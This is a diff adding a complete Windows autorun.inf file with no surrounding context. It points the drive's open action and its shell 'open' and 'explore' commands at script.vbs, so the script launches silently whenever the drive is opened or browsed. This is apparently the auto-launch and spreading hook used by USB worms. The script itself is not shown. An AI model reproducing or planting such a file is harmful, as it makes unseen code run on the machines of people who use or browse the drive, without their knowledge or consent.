@@ -1,0 +1,4 @@
+[AutoRun]
+open=script.vbs
+shell\open\Command=script.vbs
+shell\explore\Command=script.vbs
